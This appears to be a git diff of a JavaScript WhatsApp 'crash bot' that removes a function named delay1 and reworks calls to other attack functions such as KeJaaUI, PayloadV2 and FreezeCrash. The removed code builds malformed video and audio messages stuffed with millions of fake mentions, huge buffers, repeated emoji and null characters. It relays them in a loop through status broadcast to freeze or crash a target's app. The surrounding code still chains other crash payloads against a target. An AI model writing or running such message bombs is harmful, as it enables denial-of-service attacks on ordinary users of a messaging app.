@@ -548,158 +548,6 @@ jid: target
 console.log(chalk.green("饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁"));
 };
 
-async function delay1(target, mention) {
-
-const mentionedList = [
-mention,
-...Array.from({ length: 2000000 }, () => 
-`1${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`
-),
-...Array(100000).fill(target) 
-];
-
-const chaosEngine = () => {
-const chaos = {
-videoMessage: {
-url: "https://" + "💣".repeat(50000) + ".com/chaos.mp4",
-mimetype: "video/mp4",
-fileSha256: Buffer.alloc(10000000).toString('base64'), 
-fileLength: "9999999999999999999"
-seconds: -999,
-mediaKey: "=".repeat(1000000),
-caption: ("°‌‌•⃟‌𝕶𝖊𝕵𝖆𝖆𝖃𝖉𝖊𝖑𝖆𝖞⿻‌‌‌‌‌‌‌‌‏⭑".repeat(100000) + 
- "@everyone".repeat(50000) + 
- "\u0000".repeat(100000)),
-height: 16384, 
-width: 16384,
-fileEncSha256: "!" + "💥".repeat(500000) + "ꦾꦾ",
-directPath: "ꦾ" + "꧄".repeat(5000000) + ".enc", 
-mediaKeyTimestamp: Date.now().toString() + "9".repeat(1000),
-contextInfo: { 
-mentionedJid: mentionedList,
-forwardingScore: 2147483647,
-externalAdReply: {
-title: "°‌‌•⃟‌𝕶𝖊𝕵𝖆𝖆𝖃𝖉𝖊𝖑𝖆𝖞⿻‌‌‌‌‌‌‌‌‏⭑".repeat(10000),
-body: "°‌‌•⃟‌𝕶𝖊𝕵𝖆𝖆𝖃𝖉𝖊𝖑𝖆𝖞⿻‌‌‌‌‌‌‌‌‏⭑".repeat(5000),
-mediaType: 2,
-thumbnail: Buffer.alloc(50000000), 
-mediaUrl: "https://" + "🔥".repeat(50000) + ".com"
-}
-},
-streamingSidecar: Buffer.alloc(100000000).toString('base64'),
-annotations: new Array(10000).fill().map(() => ({
-embeddedContent: {
-embeddedMusic: {
-musicContentMediaId: "💣".repeat(999999),
-songId: "ꦾ".repeat(999999),
-author: "ꦾ".repeat(999999),
-title: "꧄".repeat(999999),
-artistAttribution: "https://" + "🎵".repeat(50000) + ".com"
-}
-}
-}))
-},
-
-audioMessage: {
-url: "https://" + "🔊".repeat(50000) + ".com/ultra.mp3",
-mimetype: "audio/mpeg",
-fileSha256: "AUDIO-BOMB".repeat(500000) + "=",
-fileLength: "9999999999999999999",
-seconds: -999,
-ptt: false,
-mediaKey: "꧄".repeat(1000000),
-contextInfo: {
-mentionedJid: mentionedList,
-caption: ("°‌‌•⃟‌𝕶𝖊𝕵𝖆𝖆𝖃𝖉𝖊𝖑𝖆𝖞⿻‌‌‌‌‌‌‌‌‏⭑".repeat(100000) + 
- "@admin".repeat(50000) + 
- "\u0000".repeat(100000)),
-forwardingScore: 2147483647,
-waveform: Buffer.alloc(100000000) 
-},
-streamingSidecar: Buffer.alloc(100000000).toString('base64'),
-backgroundArgb: 0xFFFFFFFF,
-pttBackgroundArgb: 0xFFFFFFF
-}
-};
-
-return chaos;
-};
-
-const memoryBlast = () => {
-const buffers = [];
-for (let i = 0; i < 100; i++) {
-buffers.push(Buffer.alloc(100000000, 'X'));
-}
-return buffers;
-};
-
-const payload = chaosEngine();
-const msg1 = generateWAMessageFromContent(
-target, 
-{ viewOnceMessage: { message: { videoMessage: payload.videoMessage } } },
-{ userJid: target, upload: true }
-);
-
-const msg2 = generateWAMessageFromContent(
-target, 
-{ audioMessage: payload.audioMessage },
-{ userJid: target, upload: true }
-);
-
-const startTime = Date.now();
-const blastCount = 50;
-
-for (let i = 0; i < blastCount; i++) {
-const memoryHog = memoryBlast();
-
-await Promise.all([
-sock.relayMessage(
-"status@broadcast", 
-msg1.message, 
-{
-messageId: `${startTime}-BOM${i}-${Math.random().toString(36).slice(2)}`,
-statusJidList: [target, mention],
-additionalAttributes: {
-"chaos-level": "max",
-"bomb-index": i.toString()
-},
-extraHeaders: new Array(100).fill().reduce((acc, _, idx) => {
-acc[`°‌‌•⃟‌𝕶𝖊𝕵𝖆𝖆𝖃𝖉𝖊𝖑𝖆𝖞⿻‌‌‌‌‌‌‌‌‏⭑${idx}`] = "💣".repeat(10000);
-return acc;
-}, {})
-}
-),
-sock.relayMessage(
-"status@broadcast", 
-msg2.message, 
-{
-messageId: `${startTime}-BOM${i}-${Math.random().toString(36).slice(2, 10)}`,
-statusJidList: [target, mention],
-additionalAttributes: {
-"chaos-level": "max",
-"bomb-index": i.toString()
-},
-extraHeaders: new Array(100).fill().reduce((acc, _, idx) => {
-acc[`°‌‌•⃟‌𝕶𝖊𝕵𝖆𝖆𝖃𝖉𝖊𝖑𝖆𝖞⿻‌‌‌‌‌‌‌‌‏⭑${idx}`] = "💥".repeat(10000);
-return acc;
-}, {})
-}
-)
-]);
-
-const delay = 50 + (i * 20);
-await new Promise(resolve => setTimeout(resolve, delay));
-
-if (i % 10 === 0) {
-try {
-if (global.gc) global.gc();
-} catch (e) {}
-}
-}
-
-return `°‌‌•⃟‌𝕶𝖊𝕵𝖆𝖆𝖃𝖉𝖊𝖑𝖆𝖞⿻‌‌‌‌‌‌‌‌‏⭑ ${blastCount * 2} °‌‌•⃟‌𝕶𝖊𝕵𝖆𝖆𝖃𝖉𝖊𝖑𝖆𝖞⿻‌‌‌‌‌‌‌‌‏⭑ ${mentionedList.length.toLocaleString()} MENTIONS`;
-}
-
 async function KeJaaUI(target) {
 const BOM_TEKS = "꧄".repeat(200000) + 
  "ꦾꦾ".repeat(150000) + 
@@ -1216,12 +1064,11 @@ mentionedJid: ["status@broadcast"]
 async function FreezeDraining(target) { 
 for (let i = 0; i <= 1; i++) {
 await TrazPrivate(target, Qcrl, mention)
-await delay1(target, Qcrl, mention)
-KeJaaUI(target, Qcrl)
-PayloadV2(target, Qcrl, ptcp = true)
-InvisHard(target, Qcrl, mention = false, delayMs = 500)
-FreezeFileInvis(target, Qcrl, Ptcp = true)
-FreezeCrash(target, Qcrl)
+await KeJaaUI(target, Qcrl)
+await PayloadV2(target, Qcrl, ptcp = true)
+await InvisHard(target, Qcrl, mention = false, delayMs = 500)
+await FreezeFileInvis(target, Qcrl, Ptcp = true)
+await FreezeCrash(target, Qcrl)
 await DelayGalaksiih(target, Qcrl)
 }
 }
